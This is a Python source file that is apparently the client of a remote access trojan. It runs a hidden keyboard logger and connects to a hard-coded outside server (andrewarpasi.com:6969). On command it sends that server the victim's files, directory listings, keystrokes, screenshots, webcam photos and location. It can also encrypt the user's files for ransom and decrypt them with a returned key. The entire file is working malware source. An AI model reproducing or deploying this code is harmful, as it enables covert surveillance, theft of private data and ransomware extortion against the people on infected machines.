#!/usr/bin/python

from socketIO_client import SocketIO, BaseNamespace
from sysPathList import *
import base64
from encryptFS import *
from decrpyter import *
import sys
import os
sys.path.insert(0, '../python-tools')
from Tracket import speak
from Tracket import printScreen
from multiprocessing import Process
import subprocess
import testLogger
import getpass
import Queue
from pygame import mixer # Load the required library

print os.getcwd()


from threading import Thread
import pyHook
import pythoncom
import win32gui
import win32console

def logger(q):
	x = ""
	log_file = "log_file.txt"                 #name of log file
	window = win32console.GetConsoleWindow()  #go to script window
	#win32gui.ShowWindow(window,0)             #hide window

	def pressed_chars(event):       #on key pressed function
		x = ""
		if event.Ascii:
			f = open(log_file,"a")  # (open log_file in append mode)
			char = chr(event.Ascii) # (insert real char in variable)
			if char == "q":         # (if char is q)
			    f.close()           # (close and save log file)	
			    exit()              # (exit program)
			if event.Ascii == 13:   # (if char is "return")
			    f.write("\n")       # (new line)
			f.write(char)           # (write char)

	proc = pyHook.HookManager()      #open pyHook
	proc.KeyDown = pressed_chars     #set pressed_chars function on KeyDown event
	proc.HookKeyboard()              #start the function
	pythoncom.PumpMessages()         #get input 



def client(q):
	class ChatNamespace(BaseNamespace):

	    def reply(self, *args):
	        print('reply', args)

	class NewsNamespace(BaseNamespace):

	    def on_aaa_response(self, *args):
	        print('on_aaa_response', args)




	def reply(*args):
	    print('reply', args)

	def fileDirReturn(data):

		if(not data['dir']):
			x = lists('/')
		else:
			x = lists(data['dir'])

		if(data['file']!= ''):
			filename = data['file']
			
			file = open(data['dir'] +"/" + data['file'], 'rb')
			fileread = file.read()
			encode = base64.encodestring(fileread)
			socketIO.emit("fileData", {'file':filename, 'filedata': encode})
		else:
			socketIO.emit("dirData", {'syslist': x})

	def keyLogReturn(data):
		file = open("log_file.txt", 'rb')
		fileread = file.read()
		encode = base64.encodestring(fileread)
		socketIO.emit("keylogData", {"keylogdata": encode})

	def encryptStuff(data):
		key = encryptionExecute()
		mixer.init()
		mixer.music.load('test.mp3')
		mixer.music.play()
		socketIO.emit("encryptData", {'key': key})

	def decryptStuff(data):
		decrypt_file(data['key'],"/Users/"+getpass.getuser()+"/Documents.zip")
		#decrypt_file(data['key'], "/Users/Hareesh/test.zip.enc")
	def tts(data):
		speak(data['text'])
	def loc(data):
		j = getLocation()
		socketIO.emit("locationData", {'lat': j['latitude'], 'long': j['longitude']})


	def screenCap(data):
		printScreen()
		file = open("screenshot.jpg", 'rb')
		fileread = file.read()
		encode = base64.encodestring(fileread)
		socketIO.emit("screenshotData", {'file':"screenshot.jpg", 'filedata': encode})


	def webcamPic(data):
		subprocess.call(['java', '-jar', 'Tracket.jar'])
		file = open("test.jpg", 'rb')
		fileread = file.read()
		encode = base64.encodestring(fileread)
		socketIO.emit("webcamData", {'file':"image.jpg", 'filedata': encode})

	socketIO = SocketIO('andrewarpasi.com', 6969)

	socketIO.emit('registerListener', {'UID': 'testID'}, reply)
	socketIO.on("feedback", reply)
	socketIO.on('fileReq', fileDirReturn)
	socketIO.on('keylog', keyLogReturn)
	socketIO.on('webcam', webcamPic)
	socketIO.on('screenshot', screenCap)
	socketIO.on('encrypt', encryptStuff)
	socketIO.on('decrypt', decryptStuff)
	socketIO.on('tts', tts)
	#SocketIO.on()

	socketIO.wait()


q = Queue.Queue()
x = ""
q.put(x)
thread = Thread(target = logger, args = [q])
thread2 = Thread(target = client, args = [q])
thread.start()
thread2.start()